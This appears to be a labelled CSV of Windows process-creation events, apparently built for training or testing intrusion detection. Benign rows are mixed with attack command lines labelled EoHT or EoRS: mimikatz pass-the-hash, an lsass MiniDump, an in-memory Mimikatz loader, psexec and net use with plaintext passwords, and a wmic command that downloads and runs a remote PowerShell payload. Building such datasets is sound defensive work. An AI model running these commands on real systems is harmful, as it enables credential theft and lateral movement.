EventID,Image,CommandLine,ParentImage,ParentCommandLine,User,Label
1,C:\Windows\System32\ping.exe,ping 8.8.8.8 -n 4,C:\Windows\System32\powershell.exe,powershell.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\ping.exe,ping 8.8.8.8 -n 4,C:\Windows\System32\powershell.exe,powershell.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\winrshost.exe,winrshost.exe -Embedding,C:\Windows\System32\svchost.exe,C:\windows\system32\svchost.exe -k DcomLaunch,DOMAIN\administrator,EoRS
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\ping.exe,ping 8.8.8.8 -n 4,C:\Windows\System32\powershell.exe,powershell.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\cmd.exe,"cmd.exe /c ""C:\Windows\Admin\psexec.exe \\10.0.0.8 -u admin -p password -d cmd.exe /c whoami""",C:\Windows\System32\powershell.exe,powershell.exe,DOMAIN\admin,EoRS
1,C:\Program Files\Git\bin\git.exe,git pull origin master,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\ping.exe,ping 8.8.8.8 -n 4,C:\Windows\System32\powershell.exe,powershell.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\cmd.exe,"mimikatz.exe ""privilege::debug"" ""sekurlsa::pth /user:Administrator /domain:windom /ntlm:ab86a1e12e12e12e12e12e12e12e12ea"" exit",C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\admin,EoHT
1,C:\Windows\System32\rundll32.exe,"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsass.dmp full",C:\Windows\System32\cmd.exe,cmd.exe,NT AUTHORITY\SYSTEM,EoHT
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\cmd.exe,"cmd.exe /c ""C:\Program Files\Microsoft VS Code\bin\code.cmd""",C:\Windows\explorer.exe,C:\Windows\Explorer.EXE,DOMAIN\gaurav,Normal
1,C:\Windows\System32\taskhostw.exe,taskhostw.exe ScheduledTasks,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\cmd.exe,"cmd.exe /c ""C:\Program Files\Microsoft VS Code\bin\code.cmd""",C:\Windows\explorer.exe,C:\Windows\Explorer.EXE,DOMAIN\gaurav,Normal
1,C:\Windows\System32\conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\taskhostw.exe,taskhostw.exe ScheduledTasks,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Program Files\Git\bin\git.exe,git pull origin master,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\taskhostw.exe,taskhostw.exe ScheduledTasks,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\lsass.exe,C:\Windows\system32\lsass.exe,C:\Windows\System32\wininit.exe,,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\lsass.exe,C:\Windows\system32\lsass.exe,C:\Windows\System32\wininit.exe,,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\ipconfig.exe,ipconfig /all,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\winrshost.exe,winrshost.exe -Embedding,C:\Windows\System32\svchost.exe,C:\windows\system32\svchost.exe -k DcomLaunch,DOMAIN\administrator,EoRS
1,C:\Windows\System32\cmd.exe,"cmd.exe /c ""C:\Program Files\Microsoft VS Code\bin\code.cmd""",C:\Windows\explorer.exe,C:\Windows\Explorer.EXE,DOMAIN\gaurav,Normal
1,C:\Windows\System32\ipconfig.exe,ipconfig /all,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer",C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,DOMAIN\gaurav,Normal
1,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer",C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\rundll32.exe,"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsass.dmp full",C:\Windows\System32\cmd.exe,cmd.exe,NT AUTHORITY\SYSTEM,EoHT
1,C:\Windows\System32\rundll32.exe,"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsass.dmp full",C:\Windows\System32\cmd.exe,cmd.exe,NT AUTHORITY\SYSTEM,EoHT
1,C:\Windows\System32\taskhostw.exe,taskhostw.exe ScheduledTasks,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\winrshost.exe,winrshost.exe -Embedding,C:\Windows\System32\svchost.exe,C:\windows\system32\svchost.exe -k DcomLaunch,DOMAIN\administrator,EoRS
1,C:\Windows\System32\conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\winrshost.exe,winrshost.exe -Embedding,C:\Windows\System32\svchost.exe,C:\windows\system32\svchost.exe -k DcomLaunch,DOMAIN\administrator,EoRS
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\ping.exe,ping 8.8.8.8 -n 4,C:\Windows\System32\powershell.exe,powershell.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\powershell.exe,"powershell.exe -ep bypass -noni -c ""[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(...)); [Invoke-Mimikatz]::pth -user admin -ntlm ab86a1e12e12ea""",C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\admin,EoHT
1,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer",C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\lsass.exe,C:\Windows\system32\lsass.exe,C:\Windows\System32\wininit.exe,,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\ipconfig.exe,ipconfig /all,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\ipconfig.exe,ipconfig /all,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\lsass.exe,C:\Windows\system32\lsass.exe,C:\Windows\System32\wininit.exe,,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\cmd.exe,"mimikatz.exe ""privilege::debug"" ""sekurlsa::pth /user:Administrator /domain:windom /ntlm:ab86a1e12e12e12e12e12e12e12e12ea"" exit",C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\admin,EoHT
1,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer",C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,DOMAIN\gaurav,Normal
1,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer",C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,DOMAIN\gaurav,Normal
1,C:\Program Files\Git\bin\git.exe,git pull origin master,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer",C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\cmd.exe,"mimikatz.exe ""privilege::debug"" ""sekurlsa::pth /user:Administrator /domain:windom /ntlm:ab86a1e12e12e12e12e12e12e12e12ea"" exit",C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\admin,EoHT
1,C:\Windows\System32\taskhostw.exe,taskhostw.exe ScheduledTasks,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\ipconfig.exe,ipconfig /all,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\ping.exe,ping 8.8.8.8 -n 4,C:\Windows\System32\powershell.exe,powershell.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\wbem\WmiPrvSE.exe,"wmic.exe /node:""10.0.0.12"" process call create ""powershell.exe -ep bypass -noni -w hidden -c (New-Object Net.WebClient).DownloadString('http://10.0.0.2/payload.ps1')""",C:\Windows\System32\wbem\WmiPrvSE.exe,WmiPrvSE.exe,NT AUTHORITY\SYSTEM,EoRS
1,C:\Windows\System32\conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\ipconfig.exe,ipconfig /all,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer",C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\lsass.exe,C:\Windows\system32\lsass.exe,C:\Windows\System32\wininit.exe,,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,C:\Windows\System32\wininit.exe,,NT AUTHORITY\SYSTEM,EoRS
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\taskhostw.exe,taskhostw.exe ScheduledTasks,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\cmd.exe,"cmd.exe /c ""C:\Program Files\Microsoft VS Code\bin\code.cmd""",C:\Windows\explorer.exe,C:\Windows\Explorer.EXE,DOMAIN\gaurav,Normal
1,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\cmd.exe,"cmd.exe /c ""C:\Program Files\Microsoft VS Code\bin\code.cmd""",C:\Windows\explorer.exe,C:\Windows\Explorer.EXE,DOMAIN\gaurav,Normal
1,C:\Windows\System32\cmd.exe,"cmd.exe /c ""C:\Program Files\Microsoft VS Code\bin\code.cmd""",C:\Windows\explorer.exe,C:\Windows\Explorer.EXE,DOMAIN\gaurav,Normal
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\cmd.exe,"cmd.exe /c ""C:\Windows\Admin\psexec.exe \\10.0.0.8 -u admin -p password -d cmd.exe /c whoami""",C:\Windows\System32\powershell.exe,powershell.exe,DOMAIN\admin,EoRS
1,C:\Windows\System32\ping.exe,ping 8.8.8.8 -n 4,C:\Windows\System32\powershell.exe,powershell.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\lsass.exe,C:\Windows\system32\lsass.exe,C:\Windows\System32\wininit.exe,,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\cmd.exe,net use \\10.0.0.5\c$ /u:Administrator secretpassword123,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\admin-gaurav,EoHT
1,C:\Windows\System32\ipconfig.exe,ipconfig /all,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\ping.exe,ping 8.8.8.8 -n 4,C:\Windows\System32\powershell.exe,powershell.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Program Files\Git\bin\git.exe,git pull origin master,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\taskhostw.exe,taskhostw.exe ScheduledTasks,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,Normal
1,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer",C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\ipconfig.exe,ipconfig /all,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Program Files\Git\bin\git.exe,git pull origin master,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,C:\Windows\System32\wininit.exe,,NT AUTHORITY\SYSTEM,EoRS
1,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer",C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\taskhostw.exe,taskhostw.exe ScheduledTasks,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\cmd.exe,"cmd.exe /c ""C:\Windows\Admin\psexec.exe \\10.0.0.8 -u admin -p password -d cmd.exe /c whoami""",C:\Windows\System32\powershell.exe,powershell.exe,DOMAIN\admin,EoRS
1,C:\Windows\System32\wbem\WmiPrvSE.exe,"wmic.exe /node:""10.0.0.12"" process call create ""powershell.exe -ep bypass -noni -w hidden -c (New-Object Net.WebClient).DownloadString('http://10.0.0.2/payload.ps1')""",C:\Windows\System32\wbem\WmiPrvSE.exe,WmiPrvSE.exe,NT AUTHORITY\SYSTEM,EoRS
1,C:\Windows\System32\conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Program Files\Git\bin\git.exe,git pull origin master,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\cmd.exe,"cmd.exe /c ""C:\Program Files\Microsoft VS Code\bin\code.cmd""",C:\Windows\explorer.exe,C:\Windows\Explorer.EXE,DOMAIN\gaurav,Normal
1,C:\Windows\System32\taskhostw.exe,taskhostw.exe ScheduledTasks,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\winrshost.exe,winrshost.exe -Embedding,C:\Windows\System32\svchost.exe,C:\windows\system32\svchost.exe -k DcomLaunch,DOMAIN\administrator,EoRS
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\wsmprovhost.exe,C:\Windows\System32\wsmprovhost.exe -Embedding,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p,DOMAIN\admin-gaurav,EoRS
1,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\ipconfig.exe,ipconfig /all,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\ipconfig.exe,ipconfig /all,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Program Files\Git\bin\git.exe,git pull origin master,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\cmd.exe,"mimikatz.exe ""privilege::debug"" ""sekurlsa::pth /user:Administrator /domain:windom /ntlm:ab86a1e12e12e12e12e12e12e12e12ea"" exit",C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\admin,EoHT
1,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\taskhostw.exe,taskhostw.exe ScheduledTasks,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\ipconfig.exe,ipconfig /all,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Program Files\Git\bin\git.exe,git pull origin master,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\wsmprovhost.exe,C:\Windows\System32\wsmprovhost.exe -Embedding,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p,DOMAIN\admin-gaurav,EoRS
1,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,C:\Windows\System32\wininit.exe,,NT AUTHORITY\SYSTEM,EoRS
1,C:\Windows\System32\ping.exe,ping 8.8.8.8 -n 4,C:\Windows\System32\powershell.exe,powershell.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\wbem\WmiPrvSE.exe,C:\windows\system32\wbem\wmiprvse.exe -secured -Embedding,C:\Windows\System32\svchost.exe,C:\windows\system32\svchost.exe -k DcomLaunch -p,NT AUTHORITY\SYSTEM,EoRS
1,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer",C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,DOMAIN\gaurav,Normal
1,C:\Program Files\Git\bin\git.exe,git pull origin master,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\cmd.exe,"mimikatz.exe ""privilege::debug"" ""sekurlsa::pth /user:Administrator /domain:windom /ntlm:ab86a1e12e12e12e12e12e12e12e12ea"" exit",C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\admin,EoHT
1,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,C:\Windows\System32\wininit.exe,,NT AUTHORITY\SYSTEM,EoRS
1,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer",C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\ipconfig.exe,ipconfig /all,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\lsass.exe,C:\Windows\system32\lsass.exe,C:\Windows\System32\wininit.exe,,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\ipconfig.exe,ipconfig /all,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\wbem\WmiPrvSE.exe,"wmic.exe /node:""10.0.0.12"" process call create ""powershell.exe -ep bypass -noni -w hidden -c (New-Object Net.WebClient).DownloadString('http://10.0.0.2/payload.ps1')""",C:\Windows\System32\wbem\WmiPrvSE.exe,WmiPrvSE.exe,NT AUTHORITY\SYSTEM,EoRS
1,C:\Windows\System32\cmd.exe,"cmd.exe /c ""C:\Program Files\Microsoft VS Code\bin\code.cmd""",C:\Windows\explorer.exe,C:\Windows\Explorer.EXE,DOMAIN\gaurav,Normal
1,C:\Windows\System32\rundll32.exe,"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsass.dmp full",C:\Windows\System32\cmd.exe,cmd.exe,NT AUTHORITY\SYSTEM,EoHT
1,C:\Windows\System32\conhost.exe,\??\C:\windows\system32\conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\GruntHTTP2.exe,"""C:\\Windows\\System32\\GruntHTTP2.exe""",THESHIRE\pgustavo,EoRS
1,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer",C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\powershell.exe,"powershell.exe -ep bypass -noni -c ""[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(...)); [Invoke-Mimikatz]::pth -user admin -ntlm ab86a1e12e12ea""",C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\admin,EoHT
1,C:\Windows\System32\taskhostw.exe,taskhostw.exe ScheduledTasks,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\SearchIndexer.exe,C:\Windows\system32\SearchIndexer.exe /Embedding,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\rundll32.exe,"rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 624 C:\Windows\Temp\lsass.dmp full",C:\Windows\System32\cmd.exe,cmd.exe,NT AUTHORITY\SYSTEM,EoHT
1,C:\Windows\System32\powershell.exe,"powershell.exe -ep bypass -noni -c ""[System.Reflection.Assembly]::Load([System.Convert]::FromBase64String(...)); [Invoke-Mimikatz]::pth -user admin -ntlm ab86a1e12e12ea""",C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\admin,EoHT
1,C:\Program Files\Git\bin\git.exe,git pull origin master,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer",C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,DOMAIN\gaurav,Normal
1,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer",C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\lsass.exe,C:\Windows\system32\lsass.exe,C:\Windows\System32\wininit.exe,,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\system32\services.exe,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\taskhostw.exe,taskhostw.exe ScheduledTasks,C:\Windows\System32\svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs,NT AUTHORITY\SYSTEM,Normal
1,C:\Windows\System32\conhost.exe,\??\C:\Windows\system32\conhost.exe 0x4,C:\Windows\System32\cmd.exe,cmd.exe,DOMAIN\gaurav,Normal
1,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe"" --type=renderer",C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\ping.exe,ping 8.8.8.8 -n 4,C:\Windows\System32\powershell.exe,powershell.exe,DOMAIN\gaurav,Normal
1,C:\Windows\System32\lsass.exe,C:\Windows\system32\lsass.exe,C:\Windows\System32\wininit.exe,,NT AUTHORITY\SYSTEM,Normal
